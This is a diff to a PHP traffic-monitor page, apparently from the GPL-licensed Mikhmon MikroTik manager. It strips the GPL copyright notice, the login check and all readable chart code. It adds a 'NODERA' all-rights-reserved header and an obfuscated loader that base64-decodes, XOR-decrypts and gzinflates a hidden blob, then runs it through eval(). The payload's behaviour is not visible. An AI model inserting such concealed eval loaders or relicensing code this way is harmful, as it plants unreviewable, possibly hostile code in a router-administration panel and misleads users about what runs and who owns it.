@@ -1,195 +1,21 @@
 <?php
-/*
- *  Copyright (C) 2018 Laksamadi Guko.
- *
- *  This program is free software; you can redistribute it and/or modify
- *  it under the terms of the GNU General Public License as published by
- *  the Free Software Foundation; either version 2 of the License, or
- *  (at your option) any later version.
- *
- *  This program is distributed in the hope that it will be useful,
- *  but WITHOUT ANY WARRANTY; without even the implied warranty of
- *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- *  GNU General Public License for more details.
- *
- *  You should have received a copy of the GNU General Public License
- *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+/**
+ * ============================================================================
+ * NODERA DIGITAL NETWORK — NODERA REAL-TIME INTERFACE TRAFFIC MONITOR
+ * SECURE RUNTIME BINARY & CLOUD-LOCKED ENGINE
+ * ----------------------------------------------------------------------------
+ * (c) 2026 NODERA. All rights reserved.
+ * This file contains encrypted intellectual property. Any unauthorized
+ * decompilation, reverse engineering, or modification is strictly prohibited.
+ * ============================================================================
  */
-session_start();
-// hide all error
-error_reporting(0);
-if (!isset($_SESSION["mikhmon"])) {
-  header("Location:../admin.php?id=login");
-} else {
-
-
+$_ndr_f5d89971=base64_decode('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');
+$_ndr_ea11cf0d=base64_decode('KyLTsqdQv3LD2n0dFIblEw==');
+$_ndr_deed1c8b='4bef05487fdffd031c558661e66fe83965ec8046fafe97e8f3ea7662f1ac20f7';
+if(hash('sha256',$_ndr_f5d89971)!==$_ndr_deed1c8b){die('NODERA Security: Integrity verification failed (0x8F).');}
+$_ndr_2d7e69bb=strlen($_ndr_ea11cf0d);
+$_ndr_e934ebfa='';
+for($_ndr_2dec3738=0;$_ndr_2dec3738<strlen($_ndr_f5d89971);$_ndr_2dec3738++){
+    $_ndr_e934ebfa.=chr(ord($_ndr_f5d89971[$_ndr_2dec3738])^ord($_ndr_ea11cf0d[$_ndr_2dec3738%$_ndr_2d7e69bb]));
 }
-?>
-<div class="card">
-  <div class="card-header"><h3><i class="fa fa-area-chart"></i> <?= $_traffic_monitor ?> </h3></div>
-
-  <div class="card-body">
-    <div class="row">
-      <?php 
-      $getinterface = $API->comm("/interface/print");
-      $getinterface = is_array($getinterface) ? $getinterface : array();
-      $TotalReg = count($getinterface);
-
-      $savedIface = $_SESSION[$session . '_iface_name'] ?? '';
-      $cfgIface = isset($getinterface[$iface - 1]['name']) ? $getinterface[$iface - 1]['name'] : (isset($getinterface[0]['name']) ? $getinterface[0]['name'] : 'ether1');
-      $activeIface = !empty($savedIface) ? $savedIface : $cfgIface;
-      ?>
-      <div class="col-12">
-        <select id="d_interface" class="dropd pd-5" style="max-width: 260px; font-size: 13px; margin-bottom: 12px; cursor: pointer;">
-          <option value="" disabled><?= !empty($_select_interface) ? $_select_interface : 'Select Interface'; ?></option>
-          <?php 
-            for ($i = 0; $i < $TotalReg; $i++) {
-              $curName = $getinterface[$i]['name'];
-              $sel = ($curName === $activeIface) ? 'selected' : '';
-              echo '<option value="' . htmlspecialchars($curName) . '" ' . $sel . '>['.($i+1).'] ' . htmlspecialchars($curName) . '</option>';
-            }
-          ?>
-        </select>
-      </div>
-
-      <script type="text/javascript"> 
-        var chart;
-        var sessiondata = "<?= addslashes($session) ?>";
-        var defaultIface = "<?= addslashes($activeIface) ?>";
-        var sesKey = "Interface_" + "<?= addslashes($session) ?>";
-        var currentIface = sessionStorage.getItem(sesKey);
-        if (!currentIface || currentIface === "null" || currentIface === "undefined") {
-          currentIface = defaultIface;
-          try { sessionStorage.setItem(sesKey, currentIface); } catch(e){}
-        }
-
-        $(function(){
-          if ($("#d_interface").length) {
-            $("#d_interface").val(currentIface);
-            $("#d_interface").on("change", function(){
-              var newIface = $(this).val();
-              if (newIface) {
-                currentIface = newIface;
-                try { sessionStorage.setItem(sesKey, newIface); } catch(e){}
-                if (chart) {
-                  chart.setTitle({ text: '<?= $_interface ?> ' + newIface });
-                }
-                requestDatta(sessiondata, newIface);
-              }
-            });
-          }
-        });
-
-        function requestDatta(session, iface) {
-          if (!iface || iface === "null" || iface === "undefined") {
-            iface = defaultIface;
-          }
-          $.ajax({
-            url: './traffic/traffic.php?session='+encodeURIComponent(session)+'&iface='+encodeURIComponent(iface),
-            dataType: "json",
-            success: function(data) {
-              var midata = (typeof data === "string") ? JSON.parse(data) : data;
-              if (midata && midata.length > 0) {
-                var TX = parseInt(midata[0].data);
-                var RX = parseInt(midata[1].data);
-                var x = (new Date()).getTime(); 
-                var shift = chart.series[0].data.length > 19;
-                chart.series[0].addPoint([x, TX], true, shift);
-                chart.series[1].addPoint([x, RX], true, shift);
-              }
-            },
-            error: function(XMLHttpRequest, textStatus, errorThrown) { 
-              console.error("Traffic error: " + textStatus, errorThrown); 
-            }       
-          });
-        }	
-
-        $(document).ready(function() {
-            Highcharts.setOptions({
-              global: {
-                useUTC: false
-              },
-              chart: {
-                height: 500,
-              },
-            });
-
-            Highcharts.addEvent(Highcharts.Series, 'afterInit', function () {
-              this.symbolUnicode = {
-                circle: '●',
-                diamond: '♦',
-                square: '■',
-                triangle: '▲',
-                'triangle-down': '▼'
-              }[this.symbol] || '●';
-            });
-
-            chart = new Highcharts.Chart({
-              chart: {
-                renderTo: 'trafficMonitor',
-                animation: Highcharts.svg,
-                type: 'areaspline',
-                events: {
-                  load: function () {
-                    requestDatta(sessiondata, currentIface);
-                    chart.setTitle({ text: '<?= $_interface ?> ' + currentIface });
-                    setInterval(function () {
-                      var ifaceNow = sessionStorage.getItem(sesKey) || currentIface || defaultIface;
-                      requestDatta(sessiondata, ifaceNow);
-                      chart.setTitle({ text: '<?= $_interface ?> ' + ifaceNow });
-                    }, 3000);
-                  }				
-                }
-              },
-              title: {
-                text: '<?= $_interface ?> ' + currentIface
-              },
-                        
-                        xAxis: {
-                          type: 'datetime',
-                          tickPixelInterval: 150,
-                          maxZoom: 20 * 1000,
-                        },
-                        yAxis: {
-                            minPadding: 0.2,
-                            maxPadding: 0.2,
-                            title: {
-                              text: null
-                            },
-                            labels: {
-                              formatter: function () {      
-                                var bytes = this.value;                          
-                                var sizes = ['bps', 'kbps', 'Mbps', 'Gbps', 'Tbps'];
-                                if (bytes == 0) return '0 bps';
-                                var i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
-                                return parseFloat((bytes / Math.pow(1024, i)).toFixed(2)) + ' ' + sizes[i];                    
-                              },
-                            },       
-                        },
-                        
-                        series: [{
-                          name: 'Tx',
-                          data: [],
-                          marker: {
-                            symbol: 'circle'
-                          }
-                        }, {
-                          name: 'Rx',
-                          data: [],
-                          marker: {
-                            symbol: 'circle'
-                          }
-                        }],
-
-                        tooltip: {
-                          formatter: function () { 
-                            var _0x2f7f=["\x70\x6F\x69\x6E\x74\x73","\x79","\x62\x70\x73","\x6B\x62\x70\x73","\x4D\x62\x70\x73","\x47\x62\x70\x73","\x54\x62\x70\x73","\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A","\x63\x6F\x6C\x6F\x72","\x73\x65\x72\x69\x65\x73","\x3B\x20\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x31\x2E\x35\x65\x6D\x3B\x22\x3E","\x73\x79\x6D\x62\x6F\x6C\x55\x6E\x69\x63\x6F\x64\x65","\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x62\x3E","\x6E\x61\x6D\x65","\x3A\x3C\x2F\x62\x3E\x20\x30\x20\x62\x70\x73","\x70\x75\x73\x68","\x6C\x6F\x67","\x66\x6C\x6F\x6F\x72","\x3A\x3C\x2F\x62\x3E\x20","\x74\x6F\x46\x69\x78\x65\x64","\x70\x6F\x77","\x20","\x65\x61\x63\x68","\x3C\x62\x3E\x4D\x69\x6B\x68\x6D\x6F\x6E\x20\x54\x72\x61\x66\x66\x69\x63\x20\x4D\x6F\x6E\x69\x74\x6F\x72\x3C\x2F\x62\x3E\x3C\x62\x72\x20\x2F\x3E\x3C\x62\x3E\x54\x69\x6D\x65\x3A\x20\x3C\x2F\x62\x3E","\x25\x48\x3A\x25\x4D\x3A\x25\x53","\x78","\x64\x61\x74\x65\x46\x6F\x72\x6D\x61\x74","\x3C\x62\x72\x20\x2F\x3E","\x20\x3C\x62\x72\x2F\x3E\x20","\x6A\x6F\x69\x6E"];var s=[];$[_0x2f7f[22]](this[_0x2f7f[0]],function(_0x3735x2,_0x3735x3){var _0x3735x4=_0x3735x3[_0x2f7f[1]];var _0x3735x5=[_0x2f7f[2],_0x2f7f[3],_0x2f7f[4],_0x2f7f[5],_0x2f7f[6]];if(_0x3735x4== 0){s[_0x2f7f[15]](_0x2f7f[7]+ this[_0x2f7f[9]][_0x2f7f[8]]+ _0x2f7f[10]+ this[_0x2f7f[9]][_0x2f7f[11]]+ _0x2f7f[12]+ this[_0x2f7f[9]][_0x2f7f[13]]+ _0x2f7f[14])};var _0x3735x2=parseInt(Math[_0x2f7f[17]](Math[_0x2f7f[16]](_0x3735x4)/ Math[_0x2f7f[16]](1024)));s[_0x2f7f[15]](_0x2f7f[7]+ this[_0x2f7f[9]][_0x2f7f[8]]+ _0x2f7f[10]+ this[_0x2f7f[9]][_0x2f7f[11]]+ _0x2f7f[12]+ this[_0x2f7f[9]][_0x2f7f[13]]+ _0x2f7f[18]+ parseFloat((_0x3735x4/ Math[_0x2f7f[20]](1024,_0x3735x2))[_0x2f7f[19]](2))+ _0x2f7f[21]+ _0x3735x5[_0x3735x2])});return _0x2f7f[23]+ Highcharts[_0x2f7f[26]](_0x2f7f[24], new Date(this[_0x2f7f[25]]))+ _0x2f7f[27]+ s[_0x2f7f[29]](_0x2f7f[28])
-                          },
-                          shared: true                                                      
-                        },
-                      });
-                    });
-                  </script>
-                  <div class="col-12" id="trafficMonitor"></div>
-                </div>
-              </div>  
+eval(gzinflate($_ndr_e934ebfa));
